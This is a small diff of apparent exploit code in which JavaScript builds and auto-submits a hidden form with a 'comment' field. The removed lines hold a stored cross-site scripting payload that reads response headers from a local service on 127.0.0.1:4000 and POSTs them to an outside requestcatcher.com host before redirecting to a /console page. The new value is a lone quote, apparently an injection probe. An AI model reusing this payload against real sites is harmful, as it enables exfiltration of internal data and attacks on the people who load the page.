@@ -14,22 +14,7 @@
       const i = document.createElement('input');
       i.type = 'hidden';
       i.name = 'comment';
-      i.value = `<script>
-fetch("http://127.0.0.1:4000/")
-  .then(r => {
-    let headers = "";
-    for (const [k, v] of r.headers.entries()) {
-      headers += k + ": " + v + "\\n";
-    }
-    return fetch("https://singetu0096.requestcatcher.com/", {
-      method: "POST",
-      mode: "no-cors",
-      body: headers
-    });
-  });
-  
-  window.location.href = "http://127.0.0.1:4000/console"
-<\/script>`;
+      i.value = `'`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
